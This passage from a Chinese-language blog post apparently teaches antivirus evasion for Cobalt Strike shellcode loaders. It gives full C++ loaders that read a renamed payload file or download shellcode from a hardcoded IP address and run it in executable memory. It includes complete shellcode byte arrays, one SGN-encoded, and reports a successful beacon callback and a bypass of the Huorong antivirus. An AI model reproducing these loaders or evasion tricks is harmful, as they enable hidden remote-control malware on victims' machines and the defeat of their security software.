class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> fileName[] = <span class="string">&quot;conx.bin&quot;</span>;</span><br><span class="line">    FILE* file;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">fopen_s</span>(&amp;file, fileName, <span class="string">&quot;rb&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;Failed to open the code file&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fseek</span>(file, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    <span class="type">long</span> size = <span class="built_in">ftell</span>(file);</span><br><span class="line">    <span class="built_in">fseek</span>(file, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* code = (<span class="type">char</span>*)<span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="keyword">if</span> (!code) &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;Failed to allocate memory for code&quot;</span>);</span><br><span class="line">        <span class="built_in">fclose</span>(file);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取内容进 code 数组</span></span><br><span class="line">    <span class="type">size_t</span> bytesRead = <span class="built_in">fread</span>(code, <span class="number">1</span>, size, file);</span><br><span class="line">    <span class="keyword">if</span> (bytesRead != size) &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;Failed to read full file content&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(code);</span><br><span class="line">        <span class="built_in">fclose</span>(file);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fclose</span>(file);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;读取成功！文件内容如下：\n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">long</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, (<span class="type">unsigned</span> <span class="type">char</span>)code[i]);</span><br><span class="line">        <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);  <span class="comment">// 每16个字节换行</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	LPVOID addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, size, MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">memcpy</span>(addr, code, size);</span><br><span class="line">	HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)addr, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">-1</span>);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>conx.bin 就是 payload.bin，心理作用改个名，怕杀软看到payload字样直接给杀了。</p>
<p>测试运行，CS成功上线</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250520144224246.png" alt="image-20250520144224246"></p>
<p>火绒成功免杀</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250520144245149.png" alt="image-20250520144245149"></p>
<p>免杀马要保存好，如果是记录哈希那种的杀软，过了一次之后就可以实现永久免杀了。</p>
<h6 id="网络分离"><a href="#网络分离" class="headerlink" title="网络分离"></a>网络分离</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winhttp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;winhttp.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析带 \x 的字符串为字节数组</span></span><br><span class="line"><span class="function">std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt; <span class="title">parseEscapedShellcode</span><span class="params">(<span class="type">const</span> std::string&amp; input)</span> </span>&#123;</span><br><span class="line">    std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt; output;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; input.<span class="built_in">length</span>(); ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (input[i] == <span class="string">&#x27;\\&#x27;</span> &amp;&amp; i + <span class="number">3</span> &lt; input.<span class="built_in">length</span>() &amp;&amp; input[i + <span class="number">1</span>] == <span class="string">&#x27;x&#x27;</span>) &#123;</span><br><span class="line">            std::string byteStr = input.<span class="built_in">substr</span>(i + <span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">char</span> byte = <span class="built_in">static_cast</span>&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;(std::<span class="built_in">stoul</span>(byteStr, <span class="literal">nullptr</span>, <span class="number">16</span>));</span><br><span class="line">            output.<span class="built_in">push_back</span>(byte);</span><br><span class="line">            i += <span class="number">3</span>; <span class="comment">// skip over this sequence</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> output;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    LPCWSTR host = <span class="string">L&quot;101.42.13.105&quot;</span>;</span><br><span class="line">    LPCWSTR path = <span class="string">L&quot;/pd.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">    std::string rawData;</span><br><span class="line">    DWORD size = <span class="number">0</span>, downloaded = <span class="number">0</span>;</span><br><span class="line">    LPSTR buffer;</span><br><span class="line">    BOOL success = FALSE;</span><br><span class="line"></span><br><span class="line">    HINTERNET hSession = <span class="built_in">WinHttpOpen</span>(<span class="string">L&quot;MyApp&quot;</span>, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,</span><br><span class="line">        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, <span class="number">0</span>);</span><br><span class="line">    HINTERNET hConnect = <span class="built_in">WinHttpConnect</span>(hSession, host, INTERNET_DEFAULT_HTTP_PORT, <span class="number">0</span>);</span><br><span class="line">    HINTERNET hRequest = <span class="built_in">WinHttpOpenRequest</span>(hConnect, <span class="string">L&quot;GET&quot;</span>, path,</span><br><span class="line">        <span class="literal">NULL</span>, WINHTTP_NO_REFERER,</span><br><span class="line">        WINHTTP_DEFAULT_ACCEPT_TYPES, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WinHttpSendRequest</span>(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, <span class="number">0</span>,</span><br><span class="line">        WINHTTP_NO_REQUEST_DATA, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) &amp;&amp;</span><br><span class="line">        <span class="built_in">WinHttpReceiveResponse</span>(hRequest, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            size = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">WinHttpQueryDataAvailable</span>(hRequest, &amp;size) || size == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            buffer = <span class="keyword">new</span> <span class="type">char</span>[size + <span class="number">1</span>];</span><br><span class="line">            <span class="built_in">ZeroMemory</span>(buffer, size + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">WinHttpReadData</span>(hRequest, buffer, size, &amp;downloaded)) &#123;</span><br><span class="line">                rawData.<span class="built_in">append</span>(buffer, downloaded);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">delete</span>[] buffer;</span><br><span class="line">        &#125; <span class="keyword">while</span> (size &gt; <span class="number">0</span>);</span><br><span class="line">        success = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WinHttpCloseHandle</span>(hRequest);</span><br><span class="line">    <span class="built_in">WinHttpCloseHandle</span>(hConnect);</span><br><span class="line">    <span class="built_in">WinHttpCloseHandle</span>(hSession);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!success) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] 下载失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清除所有空白字符</span></span><br><span class="line">    rawData.<span class="built_in">erase</span>(std::<span class="built_in">remove_if</span>(rawData.<span class="built_in">begin</span>(), rawData.<span class="built_in">end</span>(),</span><br><span class="line">        [](<span class="type">unsigned</span> <span class="type">char</span> c) &#123; <span class="keyword">return</span> std::<span class="built_in">isspace</span>(c); &#125;), rawData.<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;读取内容字符串为：&quot;</span> &lt;&lt; rawData &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析 \x 表示的字符串为字节数组</span></span><br><span class="line">    std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt; shellcode = <span class="built_in">parseEscapedShellcode</span>(rawData);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配内存并执行</span></span><br><span class="line">    LPVOID addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, shellcode.<span class="built_in">size</span>(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(addr, shellcode.<span class="built_in">data</span>(), shellcode.<span class="built_in">size</span>());</span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)addr, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250520210851607.png" alt="image-20250520210851607"></p>
<h3 id="Shellcode加载器处理"><a href="#Shellcode加载器处理" class="headerlink" title="Shellcode加载器处理"></a>Shellcode加载器处理</h3><h5 id="指针运行"><a href="#指针运行" class="headerlink" title="指针运行"></a>指针运行</h5><h6 id="void-addr"><a href="#void-addr" class="headerlink" title="((void(*)())addr)()"></a>((void(*)())addr)()</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span>  <span class="comment">//导入windows api和一些常量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) <span class="comment">//不显示黑窗口</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//main函数，程序入口函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">/* length: 892 bytes */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83...&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//1、申请内存</span></span><br><span class="line">	LPVOID addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2、拷贝 shellcode 到内存</span></span><br><span class="line">	<span class="built_in">memcpy</span>(addr, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">	</span><br><span class="line">    <span class="comment">//3、使用函数指针直接执行</span></span><br><span class="line">	((<span class="built_in">void</span>(*)())addr)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">((<span class="built_in">void</span>(*)())addr)(); </span><br><span class="line"><span class="comment">//等价于：</span></span><br><span class="line"><span class="built_in">void</span> (*func)() = (<span class="built_in">void</span>(*)())adC++dr;</span><br><span class="line"><span class="built_in">func</span>();</span><br></pre></td></tr></table></figure>

<p>将addr强制转换为一个函数指针，无参数无返回值。</p>
<p>转换后立即调用该函数，跳转并执行内存地址addr处的指令 -&gt; 即shellcode</p>
<p>正常对shellcode不做处理可以正常上线，但是使用sgn处理过的shellcode就无法上线了。。有些奇怪。</p>
<h6 id="修改内存属性"><a href="#修改内存属性" class="headerlink" title="修改内存属性"></a>修改内存属性</h6><p>有些杀软会查杀程序中是否使用了VirtualAlloc来申请内存，故可以不申请内存，直接执行unsigned char buf[]的内存中的shellcode</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span>  <span class="comment">//导入windows api和一些常量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) <span class="comment">//不显示黑窗口</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//main函数，程序入口函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">/* length: 892 bytes */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">    ((<span class="built_in">void</span>(*)()) &amp; buf) ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是还不够，因为unsigned char buf[]处的内存原有属性可能不可执行，需要修改内存属性，shellcode换成CS：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span>  <span class="comment">//导入windows api和一些常量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) <span class="comment">//不显示黑窗口</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//main函数，程序入口函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">/* length: 892 bytes */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xe8\xa0\x03\x00\x00\xeb\x04\xf2\xa7\x92\x97\x40\x11\xcc\xf4\x0d\x1c\x07\xff\x11\x00\x00\xa9\xbc\xcc\xfe\xdf\x00\x44\x30\x24\x08\x44\x02\x24\x08\xe2\xf6\x40\xed\xd0\xfa\xf6\xb8\xb3\x97\x97\x7f\xb7\xb7\xb7\x37\x74\xa5\xc4\x10\xa0\xcd\x1b\x13\x82\x8e\xeb\x93\x94\x06\x56\x18\x13\x31\xa9\xdd\x56\xc4\xd4\x9a\xed\x1f\x4f\xf7\xf6\xbd\xe7\x2d\x1e\xaf\x56\xdc\xed\x2d\x79\x85\x14\x64\x16\x3a\x98\xd9\x86\x4f\x40\x01\xfe\xbf\x9d\x4c\x9c\xdd\x0c\x32\x35\x67\x37\x38\x02\xbe\xf4\xf5\xd9\xbf\xbe\xb6\xa8\xa3\x59\xc8\xa4\x2f\xaf\x27\x27\x27\x97\xdf\x5a\x52\xd8\x3f\x77\x76\x06\x40\xcb\x73\x63\x17\x1c\x1c\xba\xf3\xf2\xdc\xbf\xe9\x5d\x10\xd9\x86\xed\xd9\x41\x09\xe4\xa8\x85\x22\xeb\x43\x72\xaa\x84\xc5\xf2\x23\xac\xed\xea\xcb\xf3\xeb\x5c\x2d\x5d\x5e\xca\xee\xe4\x51\x46\x57\x92\xaa\xea\xa8\xa3\x9b\x3f\x74\x75\x59\xbf\xf8\x6b\x57\x9f\xdb\x50\xe8\xe2\xab\x0a\xd8\x85\x0e\x0a\x72\x38\xb9\x69\x88\xce\x6f\x87\xd9\x7c\xa4\xd5\x0d\xaa\xf3\x02\x58\x0e\x4d\xa1\x01\xbc\x10\xef\xef\x37\x44\x99\x33\x7b\xcc\x1c\xe9\x58\x57\x56\x11\x88\xe2\xd0\x65\x13\x92\xe3\x4d\xd8\x34\xa9\xdd\xdd\x10\xb4\xfd\x68\x0e\x30\x39\xc6\x77\xcd\x7d\xc2\xda\x21\xdc\x89\xa1\x0e\x37\x7f\xae\x62\xcf\xfe\xbc\xf1\x3e\xf7\x36\x64\x85\xd5\x60\x9a\x1c\xa8\x8d\xd4\x83\x80\x8b\xc4\x1e\x44\xcd\x8a\xab\xd3\x6d\x4f\x4f\x4f\xe0\xc1\x86\x27\x74\xb5\x10\x74\x77\xb4\xe5\x50\xc4\x83\xf4\x63\x59\x04\x0d\xd4\x69\xa2\xe8\x61\x10\x16\x87\x45\x0a\x73\x13\x1c\xad\x40\xc2\xaa\xaa\x28\x60\xc0\x12\xbe\xff\xb1\x50\xf9\xa7\x62\x1d\xc8\x7e\xf7\xa1\xe5\x60\x03\x83\xd5\xdf\x70\x26\x4f\x3e\x64\xc9\x83\xc4\x83\xbb\xba\xb9\xb8\xb7\xf8\xc9\xfc\x0e\x5a\xdb\x19\x28\x0e\xe0\x63\x12\xc7\x42\x7c\x6b\xcc\x51\x50\x50\x40\xf6\xf5\x24\x23\x97\x1b\x1a\x1a\xc4\x8f\x9a\x6b\x8f\x8e\x8e\x4e\xa6\xfa\xf9\xf8\xf7\x16\x99\xfa\x43\x7b\x73\xf0\x0c\x77\x05\xe7\x24\x77\x12\x9a\xdd\xe1\xa9\xa4\x70\x5f\x98\xfe\x4e\x9b\xa7\x73\xf4\x25\x50\xce\x67\x45\x0d\xf5\x3f\x75\xb5\x9a\x9c\xf5\x4e\xbd\x59\xa3\x19\x5c\xc9\xdc\x86\x54\x2d\xee\xd1\xee\xda\xf1\x46\x00\x46\xdd\xee\x77\x4f\x54\x4e\x5e\x49\xbe\x5b\x6a\xd6\x43\xe2\x10\xb9\xb0\x0a\x21\x99\x2a\x91\xf0\x78\x55\xca\x2d\xb4\x12\x16\x2c\xf2\x3f\xac\x04\x6d\xf9\x55\x2a\xe5\x8c\x42\x72\x02\xa4\x37\x86\x0b\x7b\xd2\x54\xb9\x03\x6f\xf4\x8f\x2f\x5c\x8f\xc4\x41\x11\xd4\xfa\xb4\x4f\x4f\xc6\x2f\xb9\x01\x80\xf7\x44\x58\x96\x82\x5a\x10\x3c\xe9\x92\x0c\x43\xe2\x49\x7f\x2b\xd0\xc8\x58\xa8\x39\x9d\xe4\x62\xc8\x87\xaa\x64\x22\xd9\xf5\x27\x56\x9f\x98\x5d\x64\x9d\xd3\x0e\x0f\x14\x05\x0f\xef\x8d\xca\x4c\x9b\xd3\x8e\x2d\xe9\xd7\xa8\x19\x9a\x90\xc2\xd8\x98\xed\x6e\x5f\xbe\x1e\x99\x7c\x2f\x38\x77\xfb\x05\x0b\xc8\x40\xfa\xb2\x51\x4b\x8f\xdf\x34\x0c\xa9\xfe\xa8\xfd\xa0\x96\x93\x32\x9d\x46\x0c\x73\x59\xd9\xb2\xde\xca\xc0\x7d\x16\xef\xca\x6a\xaa\x28\xdd\xa8\x25\x2b\xd2\x0f\xb0\xbf\x68\x4d\x15\x8c\xdc\x04\x77\x33\xf9\xe3\xf8\xba\xd5\x46\x64\x6a\x9a\xec\x9d\x0c\x86\x51\x94\xcf\x68\x72\xa8\xc2\x78\x21\xc2\x42\x96\x4c\xda\x0a\xdd\xfd\xf2\x15\x09\x88\x14\xc6\xfd\x1e\x42\x2a\x94\x61\xcb\x14\x69\x7e\xde\x1e\x5f\x80\x17\x9e\x9d\xe1\x50\xb4\x54\x67\xbe\x37\x59\x49\x38\x69\x8a\x74\x09\xcd\xaf\x5c\x00\x0d\xe3\x91\xeb\x12\x96\xea\xa5\xaf\x30\xd5\xe5\xd1\x13\xff\xb9\x56\x7b\xe0\x1d\x78\xf6\x0d\x6d\xf8\x89\x91\x91\x45\xa3\x78\xde\x19\x18\xe2\x71\x48\xed\xd8\x96\xac\x63\xbf\xd2\x48\xfc\xd9\x65\x24\xf4\x3a\x46\x16\xd0\x3a\xb8\x85\xbb\x23\x56\xc8\x60\x1f\xca\x60\x41\x74\xce\xce\xce\x8e\x0c\x2d\x95\x95\x85\x85\x05\x32\x0b\x4b\x4b\x4b\x4b\xea\xa0\xf0\x52\xf9\xe2\x9d\x48\xfe\x49\x94\x37\x7f\xe8\x8f\xb7\xbc\x4d\xf5\x78\x20\x11\xa9\xa9\x89\x89\x09\x3e\x47\x3c\x79\xa3\x8d\x1b\x52\x4e\x09\xdc\x92\x89\x0d\x2d\x28\x00\x08\x3e\x46\xc1\x36\x7c\x79\xb0\xb5\x75\xfe\x89\x21\x79\x91\xd1\xd4\xd4\xd4\xd4\xd4\x02\x31\xa5\xc0\xc1\xc0\x3f\xee\x9c\x51\x7f\x2b\xc5\x8b\xb4\x77\x19\xc8\xf6\xc3\xb3\x75\x2b\x23\xeb\x04\x9d\x4f\x1d\xec\x41\x5b\xeb\x04\xb5\x9d\x0a\xc3\x41\x81\x73\x06\x01\xa5\x5e\xbc\x48\xff\xcf\x48\xff\xc7\xeb\x04\x4f\xa3\x63\x9e\x41\xc1\x4b\x0a\x2a\xeb\x04\xcd\xd4\xa6\x89\x41\xc1\x43\x0e\x9b\x41\x81\x43\x12\x49\x3c\x01\x20\x41\xff\xe3&quot;</span>;</span><br><span class="line">    </span><br><span class="line">	DWORD oldProject = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//修改内存属性为可读可写可执行</span></span><br><span class="line">	<span class="built_in">VirtualProtect</span>(buf, <span class="built_in">sizeof</span>(buf), PAGE_EXECUTE_READWRITE, &amp;oldProject);</span><br><span class="line">	((<span class="built_in">void</span>(*)()) &amp; buf) ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用sgn对shellcode进行加密后对火绒免杀</p>
